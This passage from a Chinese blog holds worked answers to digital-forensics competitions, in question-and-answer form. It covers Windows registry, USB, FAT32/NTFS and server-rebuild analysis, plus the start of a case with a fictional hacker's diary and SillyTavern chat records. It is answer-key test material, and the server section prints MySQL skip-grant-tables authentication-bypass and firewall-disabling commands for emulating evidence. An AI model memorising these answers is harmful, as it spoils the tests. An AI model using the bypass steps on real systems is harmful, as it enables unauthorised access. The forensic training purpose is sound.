对计算机镜像进行分析，该操作系统超管账户有记录的登录次数为？（填写数字，答案格式如：1234）\n登陆成功次数：\n答案：24\n计算机取证-4 对计算机镜像进行分析，该操作系统设置的账户密码最长存留期为多少天？（填写数字，答案格式如：1234）\n默认42天，也可以仿真：\n按下Win + R键，输入secpol.msc并回车\r找到账户策略并展开，选择密码策略 答案：42\n计算机取证-5 对计算机镜像进行分析，该操作系统安装的数据擦除软件的版本为？（答案格式：1.23）\n擦除软件为Eraser：\n答案：5.86\n计算机取证-6 对计算机镜像进行分析，该操作系统接入过一名称为 “Realtek USB Disk autorun USB Device” 的 USB 设备，其接入时分配的盘符为？（答案格式：A:）\n答案：E:\n计算机取证-7 对计算机镜像进行分析，该操作系统无线网卡分配的默认网关地址为？（答案格式：127.0.0.1）\n答案：192.168.43.1\n计算机取证-8 对计算机镜像进行分析，该操作系统配置的连接 NAS 共享文件夹的 IP 地址为？（答案格式：127.0.0.1）\n答案：192.168.188.1\n计算机取证-9 对计算机镜像进行分析，写出 “吵群技巧.txt” 文件 SM3 值的后 8 位？（大写字母与数字组合，如：D23DDF44）\n该文件在压缩包中：\n答案：10887AE1\n计算机取证-10 对计算机镜像进行分析，该操作系统通过 SSH 连接工具连接 CCTalk 测试环境的 SSH 端口为？（填写数字，答案格式如：1234）\n答案：12849\n计算机取证-11 对计算机镜像进行分析，该操作系统通过 SSH 连接工具连接的 CCTalk 境外服务器是哪个运营商的？（填写汉字，答案格式：阿里云）\n回收站的 CCTalk.xfp 恢复并运行：\n查询ip运营商：\n答案：亚马逊云\n计算机取证-12 对计算机镜像进行分析，获取机主保存在本机的 U 盾序号的后 4 位数字为？（填写数字，答案格式如：1234）\nC:\\Users\\Administrator\\Pictures\\U盾.jpeg\n常见隐写，能弄出个png：\n答案：6409\n计算机取证-13 对计算机镜像进行分析，机主存储的某篇新闻报道 “小程序搅动资源争夺战” 的发表年份为？（答案格式：2024）\ncaj转pdf：\n答案：2019\n计算机取证-14 对计算机镜像进行分析，该操作系统访问 “环球商贸” 的 IP 地址为？（答案格式：127.0.0.1）\n答案：39.108.126.128\n计算机取证-15 对计算机镜像进行分析，“环球商贸” 服务器配置的登录密码为？（答案按照实际填写，字母存在大小写）\n答案：HQSM#20231108@gwWeB\n计算机取证-16 对计算机镜像进行分析，机主安装的 PC-Server 服务环境的登录密码是？（答案按照实际填写，字母全小写）\n答案：jlb654321\n计算机取证-17 对计算机镜像进行分析，机主搭建的宝塔面板的安全入口为？（答案格式：/abc123）\n答案：/c38b336a\n计算机取证-18 对计算机镜像进行分析，机主搭建的宝塔面板的登录账号为？（答案格式：abcd）\n嵌套镜像添加为新检材：\n答案：igmxcdsa\n计算机取证-19 对计算机镜像进行分析，其搭建的宝塔面板的登录密码为？（按实际值填写）\n全局搜索 igmxcdsa，找到 pagefile.sys：\n答案：jlb1998\n计算机取证-20 对计算机镜像进行分析，机主搭建的宝塔环境中绑定的宝塔账号是？（按实际值填写）\n/www/server/panel/data/userInfo.json：\n\u0026#34;username\u0026#34;: \u0026#34;17859628390\u0026#34; 答案：17859628390\n计算机取证-21 对计算机镜像进行分析，机主搭建的宝塔面板中 Mysql 环境的 root 密码为？（按实际值填写）\n答案：123456\n计算机取证-22 对计算机镜像进行分析，机主搭建的宝塔面板中 Mysql 环境连接的端口号为？（填写数字，答案格式如：1234）\n答案：3306\n计算机取证-23 接上题，“卡号分组” 表所在的数据库名为？（答案按照实际填写，字母全小写）\n答案：a_train2023\n计算机取证-24 接上题，“孙华锦” 在 2020-07-01 10:49:07 时间节点的交易余额为？（答案格式：1234.56）\n答案：6610.94\n计算机取证-25 对 U 盘镜像进行分析，其镜像中共有几个分区？（填写数字，答案格式如：1234）\n答案：2\n计算机取证-26 对 U 盘镜像进行分析，其中 FAT32 主分区的 FAT 表数量有几个？（请使用十进制数方式填写答案，答案格式：1234）\n答案：1\n计算机取证-27 对 U 盘镜像进行分析，其中 FAT32 主分区定义的每扇区字节数为？（请使用十进制数方式填写答案，答案格式：1234）\n答案：512\n计算机取证-28 对 U 盘镜像进行分析，其中 FAT32 主分区的文件系统前保留扇区数为？（请使用十进制数方式填写答案，答案格式：1234）\n保留扇区 = FAT 扇区 - 起始扇区\n起始扇区：2048\n起始扇区：9393\n答案：7345\n计算机取证-29 对 U 盘镜像进行分析，其中 FAT32 主分区的 FAT1 表相对于整个磁盘的起始扇区数为？（请使用十进制数方式填写答案，答案格式：1234）\n答案：9393\n计算机取证-30 对 U 盘镜像进行分析，其中 NTFS 逻辑分区的 $MFT 起始簇号为？（请使用十进制数方式填写答案，答案格式：1234）\n8个扇区 = 1个簇\n312656 / 8 = 39082\n答案：39082\n计算机取证-31 对 U 盘镜像进行分析，其中 NTFS 逻辑分区的簇大小为多少个扇区？（请使用十进制数方式填写答案，答案格式：1234）\n答案：8\n计算机取证-32 对 U 盘镜像进行分析，请从该镜像的两个分区中找出使用 “新建文本文档.txt” 记录的同一个 MD5 值的两部分信息，并写出该 MD5 值的第 13\u0026ndash;20 位字符串。（答案格式：小写字母与数字组合，如：d23ddf44）\n加个文件头 FF D8 FF E1:\n另一个分区同理：\n答案：d668aee2\n程序功能分析 程序功能分析-1 对exe程序检材进行分析，计算程序的MD5（128bit）校验值的最后八位是？（答案格式：大写字母与数字组合，如：D23DDF44）\n答案：3CDD7939\n程序功能分析-2 对exe程序检材进行分析，找出其释放的可执行程序的路径？（答案格式：D:\\Document\\Aaaa）\n答案：C:\\Program Files\\Cloudflare\n服务器取证 服务器取证-1 对服务器检材进行分析，站点服务器可能是从哪个云服务平台上调证过来的？（填写汉字，答案格式：亿速云）\n答案：阿里云\n服务器取证-2 对服务器检材进行分析，站点服务器中数据库的密码是？（按实际值填写）\n用 jar 包启动的服务：\n导出 jadx 逆向分析，classes里有配置文件：\n答案：Sxy000**\n服务器取证-3 对服务器检材进行分析，站点服务器用于提供服务发现的工具名是？（答案格式：zookeeper）\n答案：consul\n服务器取证-4 对服务器检材进行分析，站点服务器数据库配置文件名是？（答案格式：database.php）\n答案：application-sxj.yaml\n服务器取证-5 对服务器检材进行分析，该网站涉及的 APP 名称是？（答案格式：微信）\n答案：顺心借\n服务器取证-6 对服务器检材进行分析，该网站用于存储大量身份证照的 OSS 中的 AccessKeyID 后八位是？（答案格式：按实际值填写）\n答案：EuZJybzD\n服务器取证-7 对服务器检材进行分析，站点服务器用于消息转发代理工具所使用的端口号是？（填写数字，答案格式：3306）\n答案：5672\n服务器取证-8 对服务器检材进行分析，站点服务器用于启动定时任务的代码片段存在于？（答案格式：LoginIndex.class）\n答案：MobileStatusTask.class\n服务器取证-9 答案：AdminIndexController.class\n服务器取证-10 对服务器检材进行分析，数据库服务器中 Docker 容器镜像中 mysql 的镜像 ID 号前 6 位是？（答案格式：123asd）\n答案：23b013\n服务器取证-11 对服务器检材进行分析，数据库服务器中 DockerCompose 的版本号是？（答案格式：1.1.1）\n答案：2.27.1\n服务器取证-12 对服务器检材进行分析，数据库服务器中用于存储后台登录账号的数据表名是？（答案格式：login）\n答案：sys_user\n服务器取证-13 对服务器检材进行分析，后台管理员 “xpt-0” 所绑定的手机号码是？（答案格式：13001880188）\n上一题同一张表\n答案：19521510863\n服务器取证-14 对服务器检材进行分析，用户首次借款初始额度是？（填写数字，答案格式：1）\n答案：4000\n服务器取证-15 对服务器检材进行分析，受害者在平台中一共结款了几次？（填写数字，答案格式：1）\n镜像有一个站点服务器和一个数据库服务器，个人仿真时全部选择了 NAT 模式\n数据库服务器，先配置网卡 BOOTPROTO=dhcp ，实现动态分配ip，避免填写 IPADDR、NETMASK、GATEWAY，再重启网络服务：\nvi /etc/sysconfig/network-scripts/ifcfg-ens33 systemctl restart network 关闭防火墙，启动 docker：\nsystemctl stop firewalld systemctl start docker 利用 skip-grant-tables 配置 my.cnf 来绕过 mysql 用户密码：\ndocker exec -it mysql8.0.39 bash sed -i \u0026#39;/\\[mysqld\\]/a skip-grant-tables\u0026#39; /etc/my.cnf exit 重启 mysql 服务，root空密码登录:\ndocker restart mysql8.0.39 docker exec -it mysql8.0.39 bash mysql -u root -p 配置 root 本地/远程密码为 123456：\nFLUSH PRIVILEGES; ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;123456\u0026#39;; ALTER USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;123456\u0026#39;; FLUSH PRIVILEGES; exit 添加 jar包中 yaml 配置中的sxy用户，授予对于 sxj_prod 数据库的最高权限：\nmysql -u root -p123456 CREATE USER \u0026#39;sxy\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;Sxy000**\u0026#39;; GRANT ALL PRIVILEGES ON sxj_prod.* TO \u0026#39;sxy\u0026#39;@\u0026#39;%\u0026#39;; FLUSH PRIVILEGES; exit 删除 skip-grant-tables：\nsed -i \u0026#39;s/skip-grant-tables/ /\u0026#39; /etc/my.cnf\rexit 重启 mysql 服务：\ndocker restart mysql8.0.39 navicat 连接数据库：\nstate表示是否禁用，改为0\n站点服务器先关闭防火墙，再配置 /etc/hosts ，根据 yaml 中的 mysql 连接域名进行域名解析配置，设置为data服务器的ip：\nsystemctl stop firewalld vi /etc/hosts 修改后台跳转地址为本机地址：\ncd /www/admin/ find ./ -type f -name \u0026#39;*js\u0026#39; -exec sed -i \u0026#39;s/47.96.140.186/61.139.2.145/g\u0026#39; {} + Redis 密码 Sxy000**，navicat 连接 redis，添加验证码：\n重启所有服务：\nsystemctl start rabbitmq-server cd /root ./consul.sh cd /data ./jar.sh 使用 19521510863/6666 登录后台：\n答案：1857\n服务器取证-16 对服务器检材进行分析，该平台中所有下单用户成功完成订单总金额是？（填写数字，答案格式：1）\n答案：11408100\n服务器取证-17 对服务器检材进行分析，该平台中逾期费率是？（答案格式：1.1）\n答案：0.1\n服务器取证-18 对服务器检材进行分析，该平台中累计还款总金额是？（填写数字，答案格式：1）\n答案：10194700\n服务器取证-19 对服务器检材进行分析，该平台总共设置了多少种借款额度？（填写数字，答案格式：1）\n有一条未启用，一共19-1种\n答案：18\n服务器取证-20 对服务器检材进行分析，该平台一共有多少个借款渠道？（填写数字，答案格式：1）\n答案：131\n服务器取证-21 对服务器检材进行分析，该平台对已完成用户收取了总计多少元服务费，结果精确到整数？（填写数字，答案格式：123）\n答案：4051915\n数据分析 数据分析-1 对计算机，手机，U 盘镜像检材综合分析，找出计算机中 VC 加密容器使用的登录密钥文件，其中逻辑大小较小的文件占用多少个字节？（答案格式：1234）\n手机 鸽哒 聊天记录：\n较小的文件：\n字节数：\n答案：1173\n数据分析-2 对计算机，手机，U 盘镜像检材综合分析，写出存储的 “带彩计划.txt” 文件的 SM3 哈希值前 8 位；（大写字母与数字组合，如：D23DDF44）\n挂载 vhd 容器，直接拖入桌面的两个 lnk ，挂载后就能找到 带彩计划.txt\n答案：AF30FFA1\n数据分析-3 对计算机，手机，U 盘镜像检材综合分析，写出存储的 “Shakepay 买币，提币流程.ppt” 文件在当前分区的起始簇号；（填写数字，答案格式如：1234）\n直接用仿真机器的 WinHex\n答案：44378\n数据分析-4 对计算机，手机，U 盘镜像检材综合分析，写出存储在手机中，用于访问钱包地址的网站登录密码；（答案按照实际填写，字母全大写）\n答案：X29772024\n数据分析-5 对计算机，手机，U 盘镜像检材综合分析，写出存储的钱包地址的前 8 位；（答案格式：abcd1234）\n助记词重置仿真机器的 metamask 密码\n答案：91cCcA87\n数据分析-6 对计算机，手机，U 盘镜像检材综合分析，写出存储的钱包地址私钥的前 8 位；（答案格式：abcd1234）\n钱包显示私钥，输入重置的密码\n答案：e87dca4c\n参考资料：\nhttps://jasmineaura.github.io/AuraBlog/cybersecurity/n2hz2zkd\nhttps://juejin.cn/post/7225474060422070330\nhttps://xz.aliyun.com/news/15771\nhttps://www.cnblogs.com/N1T0ls/articles/18856490\n","permalink":"https://blog.w8nn9z.top/posts/forensics/szb2024cs/","summary":"","title":"数证杯 2024 初赛"},{"content":"案情介绍 2025年4月，杭州滨江警方接到辖区内市民刘晓倩(简称：倩倩)报案称：其个人电子设备疑似遭人监控。经初步调查，警方发现倩倩的手机存在可疑后台活动，手机可能存在被木马控制情况；对倩倩计算机进行流量监控，捕获可疑流量包。遂启动电子数据取证程序。\n​警方通过对倩倩手机和恶意流量包的分析，锁定一名化名“起早王”的本地男子。经搜查其住所，警方查扣一台个人电脑和服务器。技术分析显示，该服务器中存有与倩倩设备内同源的特制远控木马，可实时窃取手机摄像头、手机通信记录等相关敏感文件。进一步对服务器溯源，发现“起早王”曾渗透其任职的科技公司购物网站，获得公司服务器权限，非法窃取商业数据并使用公司的服务器搭建Trojan服务并作为跳板机实施远控。 请你结合以上案例并根据相关检材，完成下面的勘验工作。\n检材下载 下载链接：https://pan.baidu.com/s/1gTA5rG3pe1uMw5_KH5fckw?pwd=wiki\n挂载/解压密码：早起王的爱恋日记❤\n检材解密/挂载 veracrypt：\n计算机取证 ftk imager 导入 windows.E01\n计算机取证-1 分析起早王的计算机检材，起早王的计算机插入过usb序列号是什么(格式：1)\n\\Windows\\System32\\config\\SYSTEM，利用registry explorer注册表分析，查找USBSTOR：\n注册表中的序列号为 20211113005552F\u0026amp;0 ，\u0026amp;0 表示该设备提供的第一个可访问的存储单元，但是需要对主体逆置一下，答案：F25550031111202\n计算机取证-2 分析起早王的计算机检材，起早王的便签里有几条待干(格式：1)\n\\Users\\起早王\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite里的Note表：\n答案：5\n计算机取证-3 分析起早王的计算机检材，起早王的计算机默认浏览器是什么(格式：Google)\n用户配置文件的注册表 \\Users\\起早王\\NTUSER.DAT，查看注册表项 \\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice：\n答案：Edge\n计算机取证-4 分析起早王的计算机检材，起早王在浏览器里看过什么小说(格式：十日终焉)\n\\Users\\起早王\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\HISTORY，存有历史浏览记录的sqlite文件：\n计算机取证-5 分析起早王的计算机检材，起早王计算机最后一次正常关机时间(格式：2020/1/1 01:01:01)\nHKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet00X\\Control\\Windows中的ShutdownTime值，这是8字节的 FILETIME 时间戳，再用DCode进行时间戳转换：\n答案：2025/4/10 11:15:29\n计算机取证-6 分析起早王的计算机检材，起早王开始写日记的时间(格式：2020/1/1)\n火眼动态仿真：\n完整日记内容：\n3:\rtext: \u0026#39;3月3日 阴\r今天考虑开始写日记，放在这里应该没人发现吧。早上在地铁上刷到公司群消息，说内网邮箱系统崩了。到工位后装模作样重启了三遍服务器，其实偷偷用自己写的脚本把日志里的报错抓出来看——特么的行政部王姐又给全公司群发20M的婚纱照，把邮件队列塞爆了。午休时在楼下便利店买关东煮，顺手连了隔壁奶茶店的WiFi，发现他们路由器密码还是默认的admin/admin...\u0026#39;\r4:\rtext: \u0026#39;3月4日 雾霾\r甲方爸爸要的报表做到凌晨两点，保存时IDE突然崩溃。摸出抽屉深处的U盘启动kali系统，用extundelete把没保存的.py文件从磁盘缓存里捞了出来。早上开会时主管夸我备份意识强，其实他电脑右下角的\u0026#34;熊猫烧香\u0026#34;图标已经闪了半个月了，考虑要不要帮他清理下木马。\u0026#39;\r5:\rtext: \u0026#39;3月5日 多云转晴\r行政部突然搞全员钓鱼邮件测试，hr发的\u0026#34;三月补贴发放通知\u0026#34;附件明显是伪装的vbs脚本。帮隔壁工位的小美恢复被加密的桌面壁纸时，发现她居然把开机密码设成自己生日——这姑娘上周还在吐槽相亲对象太直男，向我就不一样，我会把密码都藏好的。下班时收到暗网论坛私信，之前挂的单有人接盘了，五年前的老款路由器漏洞能卖顿火锅钱。\u0026#39;\r6:\rtext: \u0026#39;3月6日 大雨\r今天女神小倩回我消息了，我好开心。通宵写完的自动化脚本被主管打回重做，说要加可视化界面。蹲在安全通道抽烟时，顺手用公司WiFi抓包，发现前台小姐姐的抖音刷的都是修驴蹄子视频。晚上回家翻出吃灰的树莓派，拿小区物业的电子公告屏练手，把\u0026#34;请规范停车\u0026#34;改成了\u0026#34;三号楼快递柜有蛇\u0026#34;，结果保安大爷当真了。\u0026#39;\r7:\rtext: \u0026#39;3月7日 晴\r发现常去的煎饼果子摊支持扫码点单，研究了下他们小程序的通信协议，居然用base64裸传支付信息。在地铁上无聊写了个爬虫，抓取全市煎饼摊的芝麻投放量大数据。突然收到短信说信用卡在境外消费，吓得手抖把奶茶洒在裤子上——妈的原来是被测过的钓鱼网站反杀了，这波是终日打雁被啄了眼。\u0026#39;\r8:\rtext: \u0026#39;3月8日 阴\r小倩把我的表白拒绝了，不行，我一定要想办法让她回转心意。蹲厕所刷手机时，发现公司门禁系统推送了更新包。顺手用Burp Suite截了个包，发现验证逻辑居然用本地时间戳当盐值——这不等于把钥匙插门上吗？午休时溜到机房，把指纹机的固件降级到2018年老版本，现在刷工牌能直接触发火警测试模式（别问我是怎么知道的）。下班前给行政部发了匿名建议信，说中央空调的温度传感器可能被黑了，其实只是把温度探头粘在了咖啡机散热口。\u0026#39;\r9:\rtext: \u0026#39;3月9日 狂风\r物业突然给所有电梯加装了人脸识别，中午拿打印的部门经理照片试了试，居然能触发22楼董事长楼层按钮。在茶水间听见财务部大姐抱怨报销系统卡成PPT，偷偷往她电脑塞了个powershell脚本，把Excel宏病毒改成了自动填表机器人。半夜收到外卖小哥电话说餐被偷了，气得用SDR\rradio调频到快递柜电磁锁频段，给整栋楼柜门循环弹出一百多次。\u0026#39;\r10:\rtext: \u0026#39;3月10日 雨\r发现公司VPN的二次验证有漏洞，用失效的token加空格居然能绕过验证。拿实习生电脑当跳板摸进监控系统，把保安室屏幕切成了《恋爱循环》循环播放。行政总监路过我工位时突然夸我键盘声清脆，手抖差点把自制的橡皮鸭U盘摔地上——那里面还插着从停车场道闸偷拍的视频流呢。ai倩倩可以运行了，我的密码是qzwqzw114，怕忘记掉。\u0026#39;\r11:\rtext: \u0026#39;3月11日 雾霾爆表\r甲方突然要渗透测试报告，把三年前写的模板改了个标题就交上去，结果对方CTO居然真用默认密码登录了测试服务器。蹲在楼道给树莓派焊跳线，把隔壁创业公司的空气净化器改成了WiFi嗅探器。晚上在业主群装萌新，说地下车库有特斯拉在漏电，其实是用电磁干扰让新能源车的充电桩集体报错——谁让他们总占着残障车位充电。\u0026#39;\r12:\rtext: \u0026#39;3月12日 妖风阵阵\r发现常去的网吧更新了实名系统，用十年前某网游的账号数据库生成假身份证号，居然成功刷开机子。老板新买的\u0026#34;防沉迷摄像头\u0026#34;用的是公开漏洞的芯片，拿激光笔晃了五秒就死机，我真是太厉害了。\u0026#39;\r18:\rtext: \u0026#39;3月18日 阴雨绵绵\r公司团建玩密室逃脱，趁乱把主办方的蓝牙门锁逆向出协议，现在用手环能控制所有逃生通道的红外警报。财务大姐拉着我帮她调新买的智能跳绳，结果发现APP在后台偷偷上传通讯录，当场用Arduino板给她做了个离线计数器。半夜收到匿名威胁邮件，点开附件是张模糊的截图——我上个月在麦当劳蹭网挖矿的流量图，回敬了个带键盘记录器的虚假杀毒软件。\u0026#39;\r21:\rtext: \u0026#39;3月21日 妖风\r外卖平台更新加密算法，煎饼摊老板说扫码枪扫不出甜面酱选项。蹲在马路牙子抓包半小时，发现新版本把\u0026#34;加蛋\u0026#34;和\u0026#34;不要香菜\u0026#34;用凯撒密码互换了。顺手写了个自动化投诉脚本，专挑凌晨三点给全市智能售货机发故障指令——第二天便利店冰柜集体吐货，收银员看着满地滚的罐装可乐直骂娘。\u0026#39;\r23:\rtext: \u0026#39;3月23日 重度雾霾\r发现公司给总监们配的新款升降桌暗藏玄机，USB调试接口居然裸露在钢架内侧。午休时接上逻辑分析仪，抓到高度预设值里混着报销单审批密钥。下班前把市场部的智能咖啡机固件刷成矿机模式，现在全楼飘香时隐约能听见显卡风扇狂转。老妈突然视频查岗，手忙脚乱把正在破译的停车场车牌识别系统窗口切成《乡村爱情》播放页面。搞了个钱包，助记词老是要忘记掉怎么办，要不放在输入法里试试。\u0026#39;\r24:\rtext: \u0026#39;3月24日 沙尘暴\r甲方验收日搞突然袭击，主管的演示PPT突然变成《羊了个羊》通关教程。用应急电源给投影仪供电，同时手机热点跑SQL注入把测试数据库的假数据灌进去。庆功宴上市场部妹子醉醺醺让我修她死机的美颜手机，恢复出厂设置时蹦出她男朋友的陌陌聊天记录——现在全部门都知道行政部小刘有两张脸了。\u0026#39; 答案：2025/3/3\n计算机取证-7 分析起早王的计算机检材，SillyTavern中账户起早王的创建时间是什么时候(格式：2020/1/1 01:01:01)\n1741603496128 时间戳转换：\n答案：2025/3/10 18:44:56\n计算机取证-8 分析起早王的计算机检材，SillyTavern中起早王用户下的聊天ai里有几个角色(格式：1)\n{\u0026#34;key\u0026#34;:\u0026#34;user:default-user\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;handle\u0026#34;:\u0026#34;default-user\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;created\u0026#34;:1741603496128,\u0026#34;password\u0026#34;:\u0026#34;pBQSHaPzKzuD1iPbQ0fXCra2b1GETCRconb662oKR1+x1cP6twt8d3nxNpZH6Q85Rj9hXla5cC8rlxsgWhSmCg==\u0026#34;,\u0026#34;admin\u0026#34;:true,\u0026#34;enabled\u0026#34;:true,\u0026#34;salt\u0026#34;:\u0026#34;hrtIdbTRD0ItAkkcx1hfWw==\u0026#34;}}\r{\u0026#34;key\u0026#34;:\u0026#34;user:灵姐\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;handle\u0026#34;:\u0026#34;灵姐\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;灵姐\u0026#34;,\u0026#34;created\u0026#34;:1741604089579,\u0026#34;password\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;salt\u0026#34;:\u0026#34;ULNein789YZW7KRquG57dw==\u0026#34;,\u0026#34;admin\u0026#34;:false,\u0026#34;enabled\u0026#34;:true}}\r{\u0026#34;key\u0026#34;:\u0026#34;user:恋恋\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;handle\u0026#34;:\u0026#34;恋恋\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;恋恋\u0026#34;,\u0026#34;created\u0026#34;:1741604055707,\u0026#34;password\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;salt\u0026#34;:\u0026#34;TY2yYx5DdsxWRkhUrH64Ug==\u0026#34;,\u0026#34;admin\u0026#34;:false,\u0026#34;enabled\u0026#34;:true}}\r{\u0026#34;key\u0026#34;:\u0026#34;user:小朱\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;handle\u0026#34;:\u0026#34;小朱\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;小朱\u0026#34;,\u0026#34;created\u0026#34;:1741604071278,\u0026#34;password\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;salt\u0026#34;:\u0026#34;f/PMidRXFTzDiw+XksalCQ==\u0026#34;,\u0026#34;admin\u0026#34;:false,\u0026#34;enabled\u0026#34;:true}} 酒馆里一共四个用户，查default-user下的ai角色，双击 Start.bat 直接启动服务，密码在日记里 qzwqzw114 ，web页面会方便很多：\n也可以继续在文件里找到角色头像，根据文件名分析一共4个角色：\n答案：4\n计算机取证-9 分析起早王的计算机检材，SillyTavern中起早王与ai女友聊天所调用的语言模型(带文件后缀)(格式：xxxxx-xxxxxxx.xxxx)\n起早王和小倩的聊天记录：\n{\u0026#34;user_name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;character_name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;create_date\u0026#34;:\u0026#34;2025-03-10@19h49m24s\u0026#34;,\u0026#34;chat_metadata\u0026#34;:{\u0026#34;chat_id_hash\u0026#34;:5905727529516775,\u0026#34;note_prompt\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;note_interval\u0026#34;:1,\u0026#34;note_position\u0026#34;:1,\u0026#34;note_depth\u0026#34;:4,\u0026#34;note_role\u0026#34;:0,\u0026#34;tainted\u0026#34;:true,\u0026#34;timedWorldInfo\u0026#34;:{\u0026#34;sticky\u0026#34;:{},\u0026#34;cooldown\u0026#34;:{}},\u0026#34;lastInContextMessageId\u0026#34;:0}} {\u0026#34;name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;is_user\u0026#34;:false,\u0026#34;is_system\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:49pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;亲爱的，你回来了\u0026#34;,\u0026#34;extra\u0026#34;:{}} {\u0026#34;name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;is_user\u0026#34;:true,\u0026#34;is_system\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:49pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;嗯，是的，今天打算干什么呢？\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;isSmallSys\u0026#34;:false,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;force_avatar\u0026#34;:\u0026#34;User Avatars/user-default.png\u0026#34;} {\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null},\u0026#34;name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;is_user\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:52pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;我想学习新知识，然后我们一起去吃个饭吧\\n\\n好啊好啊，家附近有一家新开张的意大利餐厅，我还从来没有去过吃过呢！那里还有很多有趣的德国啤酒哦！！！ 起早王：听起来很棒！那我们现在就出发吧 茂名高州和杭州西湖区 随便起早王说吧 芝麻开门，我要武功秘籍！或者芝麻开门，我要当主角！\\n\\n哎呀，想想都开心死了，真是好看的小美女呢？知道我最喜欢的动漫角色是谁吗？可以告诉我吗？\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;swipe_id\u0026#34;:0,\u0026#34;swipes\u0026#34;:[\u0026#34;我想学习新知识，然后我们一起去吃个饭吧\\n\\n好啊好啊，家附近有一家新开张的意大利餐厅，我还从来没有去过吃过呢！那里还有很多有趣的德国啤酒哦！！！ 起早王：听起来很棒！那我们现在就出发吧 茂名高州和杭州西湖区 随便起早王说吧 芝麻开门，我要武功秘籍！或者芝麻开门，我要当主角！\\n\\n哎呀，想想都开心死了，真是好看的小美女呢？知道我最喜欢的动漫角色是谁吗？可以告诉我吗？\u0026#34;],\u0026#34;swipe_info\u0026#34;:[{\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:52pm\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null}}]} {\u0026#34;name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;is_user\u0026#34;:true,\u0026#34;is_system\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:55pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;小倩...你会回答我的，对吧？\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;isSmallSys\u0026#34;:false,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;force_avatar\u0026#34;:\u0026#34;User Avatars/user-default.png\u0026#34;} {\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null},\u0026#34;name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;is_user\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:57pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;晚上好呀，今天图书馆的木棉花落在你肩上的样子很美呢^_^\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;swipe_id\u0026#34;:0,\u0026#34;swipes\u0026#34;:[\u0026#34;我想学习新知识，然后我们一起去吃个饭吧\\n\\n好啊好啊，家附近有一家新开张的意大利餐厅，我还从来没有去过吃过呢！那里还有很多有趣的德国啤酒哦！！！ 起早王：听起来很棒！那我们现在就出发吧 茂名高州和杭州西湖区 随便起早王说吧 